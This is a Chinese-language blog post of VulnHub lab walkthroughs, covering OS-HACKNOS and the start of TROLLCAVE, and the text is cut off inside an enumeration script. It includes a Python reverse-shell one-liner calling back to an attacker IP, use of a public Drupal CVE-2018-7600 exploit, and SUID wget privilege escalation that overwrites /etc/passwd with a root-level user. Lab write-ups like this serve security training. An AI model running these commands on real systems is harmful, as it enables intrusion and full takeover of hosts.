<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="前言关于为什么vulnhub的主机找不到IP。参考文章：https:&#x2F;&#x2F;www.yuque.com&#x2F;summerdon&#x2F;cpubfz&#x2F;ux121k HACKNOS：OS-HACKNOS总结：识别 CMS 并利用相关的漏洞；尝试利用 suid 进行 &#x2F;etc&#x2F;passwd 文件的替换。  https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;hacknos-os-hackn">
<meta property="og:type" content="article">
<meta property="og:title" content="vulnhub 靶场记录">
<meta property="og:url" content="http://example.com/2023/04/30/Penetration/vulnhub/index.html">
<meta property="og:site_name" content="Pursue&#39;s blog">
<meta property="og:description" content="前言关于为什么vulnhub的主机找不到IP。参考文章：https:&#x2F;&#x2F;www.yuque.com&#x2F;summerdon&#x2F;cpubfz&#x2F;ux121k HACKNOS：OS-HACKNOS总结：识别 CMS 并利用相关的漏洞；尝试利用 suid 进行 &#x2F;etc&#x2F;passwd 文件的替换。  https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;hacknos-os-hackn">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411184911457.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411185017446.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411185738580.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411191021154.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411192132365.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411193806600.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411194856683.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411195057669.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411195614539.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411195717296.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411201047974.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411201533009.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412153134833.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412160500960.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412162240825.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412162317332.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412162432818.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412170453822.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412172526306.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412172927651.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412173029742.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412173705935.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412175826381.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412190534547.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412190614795.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412193954351.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412194029323.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412194050259.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412194122277.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412204629913.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412204349368.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412204938098.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/flaghost.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412205346517.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412210838166.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412211652960.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412211703847.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412212049052.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412212638439.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412213014107.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425191423696.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425194125331.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425194504837.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425195211636.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425195716470.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425201015617.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425201818451.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425202708965.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425204222285.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426144328450.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426145934864.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426154511262.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426163308419.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426163326397.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426165129888.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426165229181.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426165318867.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426165611906.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426165728214.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426170024986.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426170620609.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426183155224.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426185715094.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426195721615.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426200152359.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230427192644133.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230427194711816.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230427200542661.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429111419253.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429113521540.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429114052922.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429121558252.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429122944901.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429123449149.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429123936252.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429124331022.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429125228572.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429180107119.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429180132579.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429235645931.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230430112025731.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230430125846400.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230430132706112.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230430133116679.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230430133207566.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230430134046957.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230430135842525.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230502162604788.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230502164140590.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230502195010952.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230502200355709.png">
<meta property="article:published_time" content="2023-04-29T16:00:00.000Z">
<meta property="article:modified_time" content="2023-11-28T13:30:50.320Z">
<meta property="article:author" content="Pursue">
<meta property="article:tag" content="vulnhub">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411184911457.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>vulnhub 靶场记录</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.1.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">categories</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://gitee.com/rmrfsad/rmrfsad">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/05/14/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%9B%9B/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/04/25/Web/LKWA/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/04/30/Penetration/vulnhub/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/04/30/Penetration/vulnhub/&text=vulnhub 靶场记录"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/04/30/Penetration/vulnhub/&title=vulnhub 靶场记录"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/04/30/Penetration/vulnhub/&is_video=false&description=vulnhub 靶场记录"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=vulnhub 靶场记录&body=Check out this article: http://example.com/2023/04/30/Penetration/vulnhub/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/04/30/Penetration/vulnhub/&title=vulnhub 靶场记录"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/04/30/Penetration/vulnhub/&title=vulnhub 靶场记录"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/04/30/Penetration/vulnhub/&title=vulnhub 靶场记录"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/04/30/Penetration/vulnhub/&title=vulnhub 靶场记录"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/04/30/Penetration/vulnhub/&name=vulnhub 靶场记录&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/04/30/Penetration/vulnhub/&t=vulnhub 靶场记录"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HACKNOS%EF%BC%9AOS-HACKNOS"><span class="toc-number">2.</span> <span class="toc-text">HACKNOS：OS-HACKNOS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TROLLCAVE-1-2"><span class="toc-number">3.</span> <span class="toc-text">TROLLCAVE: 1.2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HACKNOS-OS-HAX"><span class="toc-number">4.</span> <span class="toc-text">HACKNOS: OS-HAX</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HACKNOS-OS-BYTESEC"><span class="toc-number">5.</span> <span class="toc-text">HACKNOS: OS-BYTESEC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CYNIX-1"><span class="toc-number">6.</span> <span class="toc-text">CYNIX: 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HACKNOS-OS-HACKNOS-3"><span class="toc-number">7.</span> <span class="toc-text">HACKNOS: OS-HACKNOS-3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ME-AND-MY-GIRLFRIEND-1"><span class="toc-number">8.</span> <span class="toc-text">ME AND MY GIRLFRIEND: 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CONNECT-THE-DOTS-1"><span class="toc-number">9.</span> <span class="toc-text">CONNECT THE DOTS: 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DJINN-1"><span class="toc-number">10.</span> <span class="toc-text">DJINN: 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOMDOM-1"><span class="toc-number">11.</span> <span class="toc-text">DOMDOM: 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HACKNOS-OS-HACKNOS-2-1"><span class="toc-number">12.</span> <span class="toc-text">HACKNOS: OS-HACKNOS-2.1</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        vulnhub 靶场记录
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Pursue</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-04-29T16:00:00.000Z" class="dt-published" itemprop="datePublished">2023-04-30</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Penetration/">Penetration</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/vulnhub/" rel="tag">vulnhub</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于为什么vulnhub的主机找不到IP。参考文章：<a target="_blank" rel="noopener" href="https://www.yuque.com/summerdon/cpubfz/ux121k">https://www.yuque.com/summerdon/cpubfz/ux121k</a></p>
<h2 id="HACKNOS：OS-HACKNOS"><a href="#HACKNOS：OS-HACKNOS" class="headerlink" title="HACKNOS：OS-HACKNOS"></a>HACKNOS：OS-HACKNOS</h2><p>总结：识别 CMS 并利用相关的漏洞；尝试利用 suid 进行 &#x2F;etc&#x2F;passwd 文件的替换。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-os-hacknos,401/">https://www.vulnhub.com/entry/hacknos-os-hacknos,401/</a></p>
</blockquote>
<p>嗅探存活主机。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411184911457.png" alt="image-20230411184911457"></p>
<p>nmap找一下端口。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411185017446.png" alt="image-20230411185017446"></p>
<p>利用dirsearch扫一下目录和文件。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411185738580.png" alt="image-20230411185738580"></p>
<p>查一下CMS的信息，发现是版本为7的Drupal。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411191021154.png" alt="image-20230411191021154"></p>
<p>在github上找到相应的目录：<a target="_blank" rel="noopener" href="https://github.com/pimps/CVE-2018-7600">https://github.com/pimps/CVE-2018-7600</a></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411192132365.png" alt="image-20230411192132365"></p>
<p>接下来就需要反弹一个shell，用的是python的方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 攻击机</span></span><br><span class="line">nc -lvvp <span class="number">2333</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 靶机</span></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.183.128&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411193806600.png" alt="image-20230411193806600"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span>		<span class="comment"># 改个终端</span></span><br></pre></td></tr></table></figure>

<p>在网站根目录下找到可疑文件。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411194856683.png" alt="image-20230411194856683"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411195057669.png" alt="image-20230411195057669"></p>
<p>发现切换用户失败，尝试提权。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411195614539.png" alt="image-20230411195614539"></p>
<p>利用suid进行提权。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411195717296.png" alt="image-20230411195717296"></p>
<p>利用wget进行&#x2F;etc&#x2F;passwd文件的替换。</p>
<p>首先在Kali里面生成用户和密码。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411201047974.png" alt="image-20230411201047974"></p>
<p>将靶机上的&#x2F;etc&#x2F;passwd文件复制出来，在最后一行添加。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pursue:$1$pursue$Q/oVnrEm49MGZX3Z9qFSy1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">攻击机</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用 python 开一下小型的服务器</span></span><br><span class="line">python -m http.server 1234</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">靶机</span></span><br><span class="line">wget http://192.168.183.128:1234/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure>

<p>切换用户，成功！</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230411201533009.png" alt="image-20230411201533009"></p>
<h2 id="TROLLCAVE-1-2"><a href="#TROLLCAVE-1-2" class="headerlink" title="TROLLCAVE: 1.2"></a>TROLLCAVE: 1.2</h2><p>总结：学会编写脚本提取信息；利用文件上传的漏洞替换到用户的 ssh 公钥实现无密码登录；审计 php 代码发现命令执行漏洞，执行者为超级管理员，利用 suid 实现提权。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/trollcave-12,230/">https://www.vulnhub.com/entry/trollcave-12,230/</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">信息收集</span></span><br><span class="line">arp-scan -l</span><br><span class="line">nmap -Pn -sV -A 192.168.183.130</span><br><span class="line">python dirsearch.py -u &quot;http://192.168.183.130/&quot; -e* -x 400-499		# 扫不出什么玩意儿</span><br></pre></td></tr></table></figure>

<p>在对网站进行基本的浏览后，发现这个网站应该是一个管理用户博客的一个网站，可以通过<code>/users/&lt;1~17&gt;</code>来查看不同的用户，可以看到他们的权限、博客、评论等等。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412153134833.png" alt="image-20230412153134833"></p>
<p>跟着暗月学习信息收集脚本的编写：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getinfo</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    request = requests.get(<span class="string">&quot;http://192.168.183.130/users/%s&quot;</span> % <span class="built_in">id</span>)</span><br><span class="line">    res = request.text</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &lt;h1&gt;King&#x27;s page&lt;/h1&gt;</span></span><br><span class="line">    username = re.search(<span class="string">&quot;&lt;h1&gt;(.*)\&#x27;s&quot;</span>, res).group(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># &lt;b&gt;</span></span><br><span class="line">    <span class="comment"># Superadmin</span></span><br><span class="line">    <span class="comment"># &lt;/b&gt;</span></span><br><span class="line">    level = re.search(<span class="string">&quot;\s&lt;b&gt;\s(.*)\s&lt;/b&gt;&quot;</span>, res).group(<span class="number">1</span>)</span><br><span 